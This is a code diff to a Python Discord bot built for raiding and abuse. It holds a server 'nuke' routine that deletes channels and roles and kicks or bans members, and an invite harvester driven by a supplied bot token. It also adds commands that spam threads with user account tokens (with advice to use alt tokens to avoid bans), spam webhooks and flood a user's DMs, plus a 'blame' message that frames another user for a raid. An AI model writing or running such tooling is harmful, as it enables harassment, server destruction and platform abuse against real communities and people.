+                    f"**Nuke Process Finished**\n"
+                    f"**Target Server:** `{serverid}`\n"
+                    f"**Channels:** `{status_report['channels_deleted']}` deleted, `{status_report['channels_created']}` created.\n"
+                    f"**Members:** `{status_report['members_kicked'] + status_report['members_banned']}` processed.\n"
+                    f"**Roles:** `{status_report['roles_deleted']}` deleted.\n"
+                    f"**Errors Encountered:** `{status_report['errors']}`\n"
+                    f"**Status:** `Operation Completed`"
+                ),
+                ephemeral=True
+            )
+        except Exception as e:
+            print(f"[!] Failed to send final report to user: {str(e)}")
+
+    # 11. START THE ENGINE
+    # We wrap the entire run in a task to keep the bot responsive
     asyncio.create_task(run_nuke())
 
 # invite fetcher 
@@ -1035,12 +833,12 @@ async def create_invites(interaction: discord.Interaction, token: str):
 
     async with aiohttp.ClientSession() as session:
         try:
-            # Get bot info (validates token implicitly)
+            # checking bot
             async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
                 if resp.status != 200:
                     return await interaction.followup.send("Bot token is invalid.", ephemeral=True)
 
-            # Get guilds
+            # checking guilds
             async with session.get("https://discord.com/api/v10/users/@me/guilds", headers=headers) as resp:
                 if resp.status != 200:
                     return await interaction.followup.send("Failed to fetch guilds.", ephemeral=True)
@@ -1098,7 +896,7 @@ async def create_invites(interaction: discord.Interaction, token: str):
                             json=payload
                         ) as resp:
 
-                            # If successful, stop immediately for this guild
+                            # ceching successfulness and stopping
                             if resp.status in (200, 201):
                                 data = await resp.json()
                                 code = data.get("code")
@@ -1111,7 +909,7 @@ async def create_invites(interaction: discord.Interaction, token: str):
                                 invite_created = True
                                 break
 
-                        await asyncio.sleep(0.25)  # light rate-limit protection
+                        await asyncio.sleep(0.25)  # i don't wanna rape rate-limit
 
                     if not invite_created:
                         embed.add_field(
@@ -4320,9 +4118,9 @@ async def araid(interaction: discord.Interaction, delay: float = 0.01):
     token="User token of the account to use",
     channelid="Channel to thread spam",
     amount="Amount of threads (1-25)",
-    delay="Delay between thread creation (500-10000)",
+    delay="Delay between thread creation in ms (500-10000)",
     message="What to name the threads",
-    userid="da user id ofc what else"
+    messagecontent="The message inside the thread"
 )
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.user_install()
@@ -4330,28 +4128,19 @@ async def threadspammer(
     ctx: discord.Interaction,
     token: str,
     channelid: str,
-    delay: int,
     amount: int,
+    delay: int,
     message: str,
-    userid: str
+    messagecontent:str
 ):
+    # Clamp values
+    amount = max(1, min(25, amount))
+    delay = max(500, min(10000, delay))
 
-    # Validate inputs
     channel_id = int(channelid)
-    user_id = int(userid)
-    if delay < 1000:
-        delay = 1000
-    if delay > 10000:
-        delay = 10000
-    if amount > 25:
-        amount = 25
-    if amount < 1:
-        amount = 1
+    user_id = ctx.user.id
 
-    # Get the user ID from ctx if userid param is not provided correctly
-    userId = ctx.user.id
-
-    dihcord = f"https://discord.com/api/v10/channels/{channelid}/threads"
+    dihcord = f"https://discord.com/api/v10/channels/{channel_id}/threads"
 
     payload = {
         "name": message,
@@ -4365,12 +4154,11 @@ async def threadspammer(
         "User-Agent": "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
     }
 
-    # Send initial response
     await ctx.response.send_message(
         "# ***Cyber Spammer EZZ***\n"
         "**DISCLAIMER:**\n"
-        "- Use ***ONLY*** alt usertokens for this command \n"
-        "- Use ur main token = ban from dihcord \n"
+        "- Use ***ONLY*** alt usertokens for this command\n"
+        "- Use ur main token = ban from dihcord\n"
         "-# and oh ya if shi doesn't work the token/channelid was incorrect or the account doesnt have access to create threads in the channel",
         ephemeral=True
     )
@@ -4379,30 +4167,37 @@ async def threadspammer(
         for i in range(amount):
             try:
                 async with session.post(dihcord, headers=headers, json=payload) as resp:
+                    if resp.status == 201: # success of it lol
+                        data = await resp.json()
+                        thread_id = data.get("id")
+                        
+                        if thread_id and messagecontent:
+                            msg_url = f"https://discord.com/api/v10/channels/{thread_id}/messages"
+                            async with session.post(msg_url, headers=headers, json={"content": messagecontent}) as msg_resp:
+                                if not msg_resp.ok:
+                                    print(f"[{user_id} - /threadspam] Failed to send message in thread: {msg_resp.status}")
                     if resp.status == 403:
-                        print(
-                            f"[{userId} - /threadspam ] Missing Permissions (403)")
-                        await ctx.followup.send(f"[{userId} - /threadspam ] Missing Permissions (403)")
-                        break
+                        print(f"[{user_id} - /threadspam] Missing Permissions (403)")
+                        await ctx.followup.send(f"[{user_id} - /threadspam] Missing Permissions (403)", ephemeral=True)
+                        return
                     if resp.status == 400:
-                        print(f"[{userId} - /threadspam ] Bad Request (400)")
-                        await ctx.followup.send(f"[{userId} - /threadspam ] Bad Request (400)")
-                        break
+                        print(f"[{user_id} - /threadspam] Bad Request (400)")
+                        await ctx.followup.send(f"[{user_id} - /threadspam] Bad Request (400)", ephemeral=True)
+                        return
                     if not resp.ok:
-                        print(f"/threadspam Error status {resp.status}")
-                        await ctx.followup.send(f"/threadspam Error status {resp.status}")
-                        break
+                        print(f"[{user_id} - /threadspam] Error status {resp.status}")
+                        await ctx.followup.send(f"[{user_id} - /threadspam] Error status {resp.status}", ephemeral=True)
+                        return
             except Exception as err:
-                print(f"[{userId} - /threadspam ] Network/fetch error: {str(err)}")
-                await ctx.followup.send(f"[{userId} - /threadspam ] Network/fetch error: {str(err)}")
-                break
+                print(f"[{user_id} - /threadspam] Network/fetch error: {str(err)}")
+                await ctx.followup.send(f"[{user_id} - /threadspam] Network/fetch error: {str(err)}", ephemeral=True)
+                return
 
             if i < amount - 1:
                 await asyncio.sleep(delay / 1000)
 
-    await ctx.followup.send(f"Done spamming {amount} threads!")
-
-
+    await ctx.followup.send(f"Done spamming {amount} threads!", ephemeral=True)
+    
 @bot.tree.command(name="webhookspam", description="Spam a webhook")
 @app_commands.describe(
     webhook_url="The Discord webhook URL",
@@ -4411,6 +4206,7 @@ async def threadspammer(
     name="Custom webhook username",
     pfp_image_link="Custom webhook profile picture (image URL)"
 )
+
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.user_install()
 async def webhookspam(
@@ -4429,7 +4225,7 @@ async def webhookspam(
         await interaction.response.send_message("invalid webhook url", ephemeral=True)
         return
 
-    await interaction.response.send_message(f"sending **{amount}** messages to webhook...", ephemeral=True)
+    await interaction.response.send_message(f"sending **{amount}** messages to webhook...", ephemeral=False)
     async with aiohttp.ClientSession() as session:
         payload = {
             "content": msg,
@@ -4512,7 +4308,7 @@ whitelist = config.get("whitelist", [])
 @app_commands.describe(user="The user to grant premium access to")
 async def add_premium(interaction: discord.Interaction, user: discord.User):
     if interaction.user.id not in whitelist:
-        await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
+        await interaction.response.send_message("nope, owners only fuck you", ephemeral=True)
         return
 
     add_premium_user(user.id)
@@ -4531,7 +4327,7 @@ async def rem_premium(interaction: discord.Interaction, user: discord.User):
     if removed:
         await interaction.response.send_message(f"✅ User {user.mention} has been removed from premium access!", ephemeral=False)
     else:
-        await interaction.response.send_message(f"⚠️ User {user.mention} does not have premium access.", ephemeral=True)
+        await interaction.response.send_message(f"⚠️ Broke bozo {user.mention} does not have premium access.", ephemeral=True)
 
 
 class RoastButton(discord.ui.View):
@@ -4552,7 +4348,7 @@ class RoastButton(discord.ui.View):
             with open("roasts.txt", "r", encoding="utf-8") as f:
                 roasts = [line.strip() for line in f if line.strip()]
             if not roasts:
-                await interaction.followup.send("No roasts found 😅")
+                await interaction.followup.send("Could not finy any roast")
                 return
         except FileNotFoundError:
             await interaction.followup.send("The file `roasts.txt` was not found.")
@@ -4659,7 +4455,7 @@ async def spoof_image(
 @app_commands.describe(user="📰 The user you want to blame..")
 async def blame(interaction: discord.Interaction, user: discord.User):
     await interaction.response.send_message("Blaming... ✏️", ephemeral=True)
-    await interaction.followup.send(f"{user.mention}, Your Raid Command has been Successfully Completed! ✅")
+    await interaction.followup.send(f" SERVER FUCKED BY {user.mention} EZZZZZZZZ")
     await log_command_use(interaction.user, "blame")
 
 
@@ -4686,37 +4482,77 @@ async def anon_dm(
     )
 
 
-@bot.tree.command(name="flooduser",
-                  description="[💎] Flood a user's DMs with messages. (premium only!)")
-@app_commands.describe(user="The user to DM spam",
-                       message="Message to spam",
-                       times="How many times to send",
-                       delay="Delay between messages (in sec)")
+@bot.tree.command(
+    name="flooduser",
+    description="flood dms of a member"
+)
+@app_commands.describe(
+    user="The user to DM spam",
+    message="Message to spam",
+    times="How many times to send",
+    delay="Delay between messages (in sec)",
+    token="Your own Discord bot token (optional)"
+)
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.user_install()
 async def flooduser(
-        interaction: discord.Interaction,
-        user: discord.User,
-        message: str,
-        times: int = 5,
-        delay: float = 0.3):
+    interaction: discord.Interaction,
+    user: discord.User,
+    message: str,
+    times: int = 5,
+    delay: float = 0.3,
+    token: Optional[str] = None,
+):
     if not is_premium_user(interaction.user.id):
-        await interaction.response.send_message("💎 This command is only available for premium users.", ephemeral=True)
+        await interaction.response.send_message("You ain't OG bro", ephemeral=True)
         return
-    await interaction.response.send_message("Flooding user... 💣", ephemeral=True)
+
+    await interaction.response.send_message("Sending msgs to user... 💣", ephemeral=True)
+
     await log_command_use(
         user=interaction.user,
-        command_name="💎 flooduser",
+        command_name="flooduser",
         channel=interaction.channel,
         message=message
     )
-    for _ in range(times):
-        try:
-            await user.send(message)
-            await asyncio.sleep(delay)
-        except discord.Forbidden:
-            await interaction.followup.send("❌ Could not DM user (they may have DMs closed).", ephemeral=True)
-            break
+
+    async def send_dm_via_http(tok: str, uid: int, msg: str) -> int:
+        headers = {
+            "Authorization": f"Bot {tok}",
+            "Content-Type": "application/json"
+        }
+        payload = {"content": msg}
+
+        async with aiohttp.ClientSession() as session:
+            async with session.post(
+                f"https://discord.com/api/v10/users/{uid}/dm",
+                headers=headers,
+                json=payload
+            ) as resp:
+                return resp.status
+
+    if token:
+        for _ in range(times):
+            try:
+                status = await send_dm_via_http(token, user.id, message)
+                if status == 403:
+                    await interaction.followup.send("yo they got me blocked or got dms closed.", ephemeral=True)
+                    break
+                if status != 200:
+                    await interaction.followup.send(f"API error: {status}", ephemeral=True)
+                    break
+                await asyncio.sleep(delay)
+            except Exception as e:
+                await interaction.followup.send(f"Error: {str(e)}", ephemeral=True)
+                break
+    else:
+        for _ in range(times):
+            try:
+                await user.send(message)
+                await asyncio.sleep(delay)
+            except discord.Forbidden:
+                await interaction.followup.send("yo they got me blocked or got dms closed.", ephemeral=True)
+                break
 
 
 @bot.event
@@ -4740,9 +4576,18 @@ async def on_ready():
                         Fore.WHITE}commands{
                             Fore.MAGENTA}.{
                                 Fore.WHITE}")
-    except Exception as e:
-        print(f"Failed to sync commands: {e}")
 
+        # Print all registered slash command names
+        all_cmds = bot.tree.get_commands()
+        print(
+            f"{
+                Fore.MAGENTA}>{
+                Fore.WHITE} Registered commands: {
+                    Fore.CYAN}{
+                        [c.name for c in all_cmds]}{
+                            Fore.WHITE}")
+    except Exception:
+        traceback.print_exc()
 
 if __name__ == "__main__":
     TOKEN = token_management()
